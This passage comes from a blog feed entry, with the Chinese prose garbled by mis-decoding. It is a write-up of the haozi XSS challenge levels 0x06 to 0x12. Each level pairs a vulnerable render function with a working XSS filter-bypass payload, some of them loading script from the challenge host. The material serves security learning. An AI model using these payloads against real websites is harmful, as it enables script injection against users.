class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/auto|on.*=|&gt;/ig</span>, <span class="string">'_'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;input value=1 <span class="subst">$&#123;input&#125;</span> type="text"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¥½å§ï¼Œå°è¯•äº†å¾ˆä¹…ï¼Œæƒ³åˆ°äº†è¿™ç§å‡ºç°åœ¨æ ‡ç­¾å†…éƒ¨çš„è¾“å…¥ç‚¹ï¼Œæœ‰ä¸¤ç§æ€è·¯ï¼Œä¸€ä¸ªæ˜¯åœ¨æ ‡ç­¾å†…éƒ¨çš„å±æ€§å’Œäº‹ä»¶æ¥è§¦å‘jsï¼›ä¸€ä¸ªæ˜¯é—­åˆç°åœ¨çš„æ ‡ç­¾å»æ’å…¥æ–°çš„æ”»å‡»å‘é‡ã€‚æƒ³äº†è€ä¹…ä¸çŸ¥é“æ€ä¹ˆç ´â€¦â€¦çœ‹äº†writeupå¾—çŸ¥æ˜¯åˆ©ç”¨æ¢è¡Œï¼Œè¿™é‡Œå°±æœ‰ä¸€ä¸ªå°ç»†èŠ‚äº†ï¼Œè¿™é‡Œçš„æ­£åˆ™æ˜¯<code>on.*=</code>è¿™æ„å‘³ç€<code>on</code>å’Œ<code>=</code>æ˜¯ä»¥ä¸€ä¸ªæ•´ä½“å»åˆ¤æ–­çš„ï¼Œè¿™ç§ä»¥æ•´ä½“å½¢å¼å»åšåˆ¤æ–­çš„é€»è¾‘å¯ä»¥ç”¨ä¸€äº›æ‹†åˆ†æŠ€å·§äº†ç»•è¿‡ã€‚æ‰€ä»¥æ­£ç¡®çš„payloadä¸º<code>onmousemoveæ¢è¡Œ=alert(1)</code>ã€‚</p><p>è¿™é‡Œè¯•äº†å¾ˆä¹…éƒ½æ²¡æ‰¾åˆ°éäº¤äº’çš„æ“ä½œï¼Œæœ€åè¿˜æ˜¯åªæœ‰äº¤äº’æ“ä½œè§¦å‘xssã€‚</p><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span></span><br><span class="line"></span><br><span class="line">  input = input.replace(stripTagsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;article&gt;<span class="subst">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çŸ¥è¯†ç‚¹ï¼šåˆ©ç”¨æµè§ˆå™¨çš„è‡ªåŠ¨è¡¥å…¨ç‰¹æ€§ç»•è¿‡â€¦â€¦åˆæ˜¯ä¸€ä¸ªè€çŸ¥è¯†ç‚¹å°±æ˜¯æ²¡æƒ³åˆ°è¿™ä¸ªç‚¹ï¼Œæƒ³åˆ°äº†è¦åœ¨<code>&lt;&gt;</code>ä¸Šåšæ–‡ç« ï¼Œæ²¡æƒ³åˆ°è‡ªåŠ¨è¡¥å…¨ã€‚ã€‚ã€‚è®°ä¸ªç¬”è®°å½“æ ‡ç­¾ä¸å®Œæ•´çš„æ—¶å€™<code>&lt;img src=1 onerror=alert(1)</code> ï¼Œåƒè¿™æ ·æµè§ˆå™¨ä¼šè‡ªåŠ¨æŠŠæœ«å°¾çš„<code>&gt;</code>ç”¨å…¶ä»–çš„æ ‡ç­¾è¡¥å……ä¸Šã€‚å®é™…è‡ªåŠ¨è¡¥å……å¦‚ä¸‹å›¾ï¼š</p><img src="/2019/01/27/haozi-xss-challenges/1.png"><p>è€Œæˆ‘ä»¬çš„è¾“å…¥æ‹¼æ¥ä¸Šå®é™…ä¸Šæ˜¯è¿™æ ·çš„<code>&lt;article&gt;&lt;img src=1 onerror=alert(1) &lt;/article&gt;</code></p><p>å¯ä»¥çœ‹åˆ°åŸæ¥çš„<code>&lt;/article&gt;</code>æˆäº†imgæ ‡ç­¾ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œéšåæµè§ˆå™¨åˆåœ¨åé¢è¡¥å……äº†ä¸€ä¸ª<code>&lt;/article&gt;</code>ã€‚</p><h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">src</span>) </span>&#123;</span><br><span class="line">  src = src.replace(<span class="regexp">/&lt;\/style&gt;/ig</span>, <span class="string">'/* \u574F\u4EBA */'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;src&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡ç‚¹ä¾æ—§æ˜¯æ­£åˆ™è¿‡æ»¤çš„é—®é¢˜ï¼Œè¿™é‡Œçš„è¿‡æ»¤è§„åˆ™å†™çš„å¤ªæ­»ï¼Œæ‰€ä»¥å¯ä»¥åœ¨ä¸­é—´åŠ å…¥ç©ºæ ¼æˆ–è€…æ¢è¡Œæ¥ç»•è¿‡ã€‚</p><p><code>&lt;/style &gt;&lt;img src=1 onerror=alert(1)&gt;</code>æˆ–è€…<code>&lt;/styleæ¢è¡Œ&gt;&lt;img src=1 onerror=alert(1)&gt;</code></p><h2 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;input&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶é™åˆ¶äº†å¿…é¡»è¦åœ¨<code>www.segmentfault.com</code>è¿™ä¸ªåŸŸä¸‹ï¼Œä½†æ˜¯ä¹Ÿæ²¡è¿‡æ»¤å…¶ä»–å±é™©å­—ç¬¦ï¼Œé‚£æˆ‘ä»¬ç›´æ¥é—­åˆå‰é¢çš„scriptç„¶ååœ¨åé¢æ„é€ è‡ªå·±çš„æ¶æ„è„šæœ¬å°±è¡Œã€‚<code>https://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://xss.haozi.me/j.js</code></p><p>ä¸Šé¢æ˜¯åˆ©ç”¨åŒå¼•å·å­—ç¬¦å»ç»“åˆæ„é€ çš„payloadï¼Œä¹Ÿå¯ä»¥ç›´æ¥æ³¨é‡Šæ‰ã€‚<code>https://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;svg/onload=alert(1)&gt;//</code></p><h2 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f'</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;escapeHtml(input)&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜æ˜¯ä¸Šé“é¢˜ç›®çš„åŠ å¼ºç‰ˆï¼ŒæŠŠå¤šä½™çš„ç‰¹æ®Šå­—ç¬¦éƒ½è½¬ä¹‰æˆhtmlå®ä½“äº†ï¼Œè¿™æ ·å°±æ²¡æœ‰åŠæ³•çªç ´srcè¿™ä¸ªå­—ç¬¦ä¸²ï¼Œçªç ´å£åªèƒ½åœ¨srcè¿™é‡Œã€‚è§‚å¯Ÿå‘ç°æ²¡æœ‰è¿‡æ»¤<code>@</code>å’Œ<code>#</code>æƒ³åˆ°åº”è¯¥æ˜¯è¦ç”¨åˆ°urlç›¸å…³çš„trickã€‚æŠŠorangeçš„pptç¿»å‡ºæ¥å¤ä¹ ï¼Œè¯•äº†<code>@</code>å’Œ<code>#@</code>éƒ½ä¸è¡Œã€‚ã€‚ã€‚ä¸€è„¸æ‡µé€¼</p><p>æœ€åå»çœ‹äº†å…¶ä»–äººçš„writeupï¼Œç­”æ¡ˆæ˜¯<code>https://www.segmentfault.com@xss.haozi.me/j.js</code></p><p>åˆ©ç”¨<code>@</code>çš„å­èµ„æºè¯·æ±‚åŠŸèƒ½å»è¯·æ±‚æ¶æ„çš„jsï¼Œç„¶è€Œæˆ‘æ˜¯ç”¨chromeæ¥åšé¢˜çš„ï¼Œä¹‹å‰åŠå¤©æ²¡ååº”ï¼Œåœ¨æ§åˆ¶å°çœ‹äº†çœ‹ï¼Œå‘ç°chromeç¦ç”¨äº†å­èµ„æºè¯·æ±‚ã€‚å¤ªå°´å°¬äº†â€¦â€¦</p><img src="/2019/01/27/haozi-xss-challenges/2.png"><img src="/2019/01/27/haozi-xss-challenges/3.png"><p>æœ€ååœ¨ç«ç‹æµ‹è¯•æˆåŠŸï¼Œchromeçš„å®‰å…¨æ€§çœŸæ˜¯é«˜ã€‚</p><h2 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;h1&gt;<span class="subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜æ˜¯æŠŠè¾“å…¥å…¨éƒ¨è½¬æˆå¤§å†™å­—æ¯ï¼Œè¿™æ ·çš„è¯<code>alert</code>å°±æ²¡æœ‰åŠæ³•æ‰§è¡Œã€‚ä½†æ˜¯æˆ‘ä»¬æœ‰ç¼–ç å•Šï¼Œå¹¶ä¸”å¤§å°å†™å¯¹æ ‡ç­¾å’Œå±æ€§äº‹ä»¶æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥åªè¦æŠŠ<code>alert(1)</code>çš„éƒ¨åˆ†æ¢æˆjsç¼–ç å°±okäº†ã€‚</p><p><code>&lt;img src=1 onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#10;&gt;</code></p><h2 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/script/ig</span>, <span class="string">''</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>emmmï¼Œè¿™ä¸ªé¢˜ç›®æœ‰ç‚¹æ°´å•Šâ€¦â€¦å°±æ˜¯å¤šè¿‡æ»¤äº†ä¸€ä¸ªscriptï¼Œé‚£ä¸ç”¨scriptå°±å¥½äº†ï¼Œæ–¹æ³•å¤šçš„ç”¨ä¸è¿‡æ¥è€Œä¸”ä¸Šä¸€æ¬¡payloadåŒæ ·æœ‰æ•ˆã€‚<code>&lt;img src=1 onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#10;&gt;</code></p><h2 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/[&lt;/"']/g</span>, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert('<span class="subst">$&#123;input&#125;</span>')</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ç§è¾“å…¥ç‚¹å‡ºç°åœ¨jsçš„å•è¡Œæ³¨é‡ŠåŒºåŸŸï¼Œå¯ä»¥ç”¨æ¢è¡Œç»•è¿‡å•è¡Œæ³¨é‡Šã€‚å‰©ä¸‹çš„ä¸€æ­¥æ€è€ƒäº†å¾ˆå¤šï¼Œç”±äºè¿‡æ»¤äº†<code>&lt;/&quot;&#39;</code>ï¼Œä¸èƒ½é—­åˆæœ«å°¾çš„<code>&#39;)</code>ï¼Œä¹Ÿä¸èƒ½ç”¨æ™®é€šçš„æ³¨é‡Š<code>//</code>ï¼Œ<code>/*</code>ï¼Œ<code>&lt;!--</code>ã€‚çœ‹äº†çœ‹writeupï¼Œç»“æœæ˜¯ç”¨<code>--&gt;</code>ï¼Œæˆ‘æœ‰ç‚¹å‚»çœ¼äº†ï¼Œä»€ä¹ˆé¬¼â€¦â€¦</p><p>æµ‹è¯•äº†ä¸€ä¼šå„¿ï¼Œå¾—å‡ºç»“è®ºï¼š<code>--&gt;</code>æœ‰å’Œ<code>//</code>ä¸€æ ·çš„æ•ˆæœï¼ŒåŒæ ·æ˜¯å•è¡Œæ³¨é‡Šã€‚è¿™ä¸ªçœŸçš„æ˜¯æ¶¨å§¿åŠ¿äº†ï¼Œä»¥å‰åªçŸ¥é“ç”¨ä¸Šé¢çš„ä¸‰ç§ï¼Œç»“æœç°åœ¨åˆæ¥ä¸€ç§ã€‚</p><p>payloadï¼š<code>æ¢è¡Œalert(1)æ¢è¡Œ--&gt;</code></p><h2 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">'&lt;_$1'</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ ·æƒ³äº†è€ä¹…ï¼Œçœ‹äº†å…¶ä»–äººçš„æ€è·¯æç„¶å¤§æ‚Ÿâ€¦â€¦è¿™é‡Œç”±äºæŠŠæ‰€æœ‰çš„æ ‡ç­¾å‰é¢éƒ½åŠ äº†ä¸‹åˆ’çº¿ï¼ŒåŸºæœ¬ä¸Šæ­£å¸¸ä½¿ç”¨çš„æ ‡ç­¾éƒ½GGã€‚ç„¶è€Œè¿™é‡Œè¦ç”¨åˆ°ä¹‹å‰çš„ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œé‚£å°±æ˜¯å‡ºç°åœ¨è¿™ç§æœ‰å¤§å°å†™è½¬æ¢çš„åœ°æ–¹ï¼Œæœ‰äº›ç‰¹æ®Šå­—ç¬¦åœ¨è½¬æ¢çš„æ—¶å€™ä¹Ÿä¼šå˜æˆæ­£å¸¸çš„è‹±æ–‡å¤§å†™å­—æ¯ã€‚å‚è€ƒï¼š<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank" rel="noopener">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p><p>èƒ½åˆ©ç”¨çš„æ˜¯iå’Œsï¼Œè¿™é‡Œç”¨ç‰¹æ®Šå­—ç¬¦ç»•è¿‡æ­£åˆ™ï¼Œç„¶åé€šè¿‡å¤§å†™å‡½æ•°è½¬æ¢æˆæ­£å¸¸å­—æ¯è¾¾åˆ°ç›®çš„ã€‚<code>&lt;Ä±mg src=1 onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#10;&gt;</code>æˆ–è€…<code>&lt;Å¿cript src=https://xss.haozi.me/j.js&gt;&lt;/script&gt;</code></p><h2 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f;'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;img src onerror="console.error('<span class="subst">$&#123;escapeHtml(input)&#125;</span>')"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ç¼–ç é™¤äº†å®ä½“ç¼–ç æ˜¯å¼ºè¡Œå˜æˆå­—ç¬¦ä¸²ï¼Œå…¶ä»–çš„<code>&amp;#</code>ç±»ç¼–ç éƒ½æ˜¯å¯ä»¥ç”¨çš„ï¼Œå…¸å‹çš„çº¸è€è™è¿‡æ»¤ã€‚æ‰€ä»¥è¿™é‡Œä»å•å¼•å·é€ƒé€¸å‡ºæ¥ï¼Œæ’å…¥alertï¼Œè¿‡æ»¤åé¢çš„æ— ç”¨éƒ¨åˆ†ã€‚</p><p><code>&#39;);alert(1);//</code></p><h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  window.data = <span class="subst">$&#123;input&#125;</span></span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜æœ‰ç‚¹è«åå…¶å¦™ã€‚ã€‚ã€‚éšæ‰‹è¾“å…¥äº†ä¸€ä¸ª<code>alert(1)</code>å°±æˆåŠŸäº†ã€‚ã€‚ã€‚éƒ½ä¸çŸ¥é“å‘ç”Ÿäº†ä»€ä¹ˆã€‚</p><p>çœ‹äº†å…¶ä»–äººçš„ç­”æ¡ˆéƒ½æ˜¯é—­åˆè¯­å¥ï¼Œç„¶åæ’å…¥çš„<code>alert(1)</code>ã€‚<code>1;alert(1);</code></p><p>æŸ¥äº†ä¸€ä¸‹windowçš„å±æ€§åˆ—è¡¨ï¼Œæ²¡æœ‰dataå±æ€§ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥è¾“å…¥<code>alert(1)</code>å°±ä¼šè§¦å‘å¼¹çª—ã€‚</p><h2 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeJs</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>(s)</span><br><span class="line">            .replace(<span class="regexp">/\\/g</span>, <span class="string">'\\\\'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'\\\''</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">            .replace(<span class="regexp">/`/g</span>, <span class="string">'\\`'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'\\74'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'\\76'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'\\/'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\n/g</span>, <span class="string">'\\n'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\r/g</span>, <span class="string">'\\r'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\t/g</span>, <span class="string">'\\t'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\f/g</span>, <span class="string">'\\f'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\v/g</span>, <span class="string">'\\v'</span>)</span><br><span class="line">            <span class="comment">// .replace(/\b/g, '\\b')</span></span><br><span class="line">            .replace(<span class="regexp">/\0/g</span>, <span class="string">'\\0'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  var url = 'javascript:console.log("<span class="subst">$&#123;s&#125;</span>")'</span></span><br><span class="line"><span class="string">  var a = document.createElement('a')</span></span><br><span class="line"><span class="string">  a.href = url</span></span><br><span class="line"><span class="string">  document.body.appendChild(a)</span></span><br><span class="line"><span class="string">  a.click()</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆæ˜¯ä¸€ä¸ªçº¸è€è™è¿‡æ»¤ï¼Œåœ¨jsçš„å­—ç¬¦ä¸²ä¸­ä»£å…¥åæ–œçº¿ä¼šè¢«è§£é‡Šæˆè½¬ä¹‰ç¬¦ï¼Œä½†æ˜¯ç”±äºåŸæœ¬æ•´ä½“å°±æ˜¯å­—ç¬¦ä¸²æ‰€ä»¥è½¬ä¹‰ç¬¦è½¬ä¹‰è¿‡åè¿˜æ˜¯å­—ç¬¦ä¸²ï¼Œç­‰äºæ²¡æœ‰æ„ä¹‰ï¼Œæ‰€ä»¥ç›´æ¥é—­åˆå‰é¢çš„<code>console.log</code>æ’å…¥jsè¯­å¥ã€‚</p><p><code>&#39;console.log(&quot;\&quot;)\/\/&#39;</code> åƒè¿™æ ·çš„å­—ç¬¦ä¸²å®é™…ä¸Šä¸º<code>&#39;console.log(&quot;&quot;)//&#39;</code>ã€‚å¯ä»¥çœ‹åˆ°åæ–œçº¿åœ¨å­—ç¬¦ä¸²ä¸­æ²¡æœ‰ä»»ä½•ä½œç”¨ã€‚</p><p>æœ€åpayloadï¼š<code>&quot;);alert(&quot;1</code>æˆ–è€…<code>&quot;);alert(1)//</code></p><h2 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = s.replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å’Œä¸Šä¸€é¢˜ç±»ä¼¼çš„é¢˜ç›®ï¼Œåªæ˜¯æ²¡æœ‰äº†å¤šä½™çš„å­—ç¬¦ä¸²ä¸­è½¬ï¼Œç°åœ¨çš„åæ–œçº¿å°±æœ‰æ•ˆæœäº†ï¼Œç„¶è€Œæ²¡æœ‰è¿‡æ»¤åæ–œçº¿ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ç”¨åæ–œçº¿è½¬ä¹‰è¿‡æ»¤ç”¨çš„é‚£ä¸ªåæ–œçº¿ï¼Œè¿™æ ·å°±é€ æˆå­—ç¬¦ä¸²é€ƒé€¸ï¼Œéšæ„æ’å…¥è¯­å¥å³å¯ã€‚</p><p><code>\&quot;);alert(1)//</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h2&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="XSS" scheme="https://hurricane618.me/tags/XSS/"/>
    
  </entry>
  
  <entry>
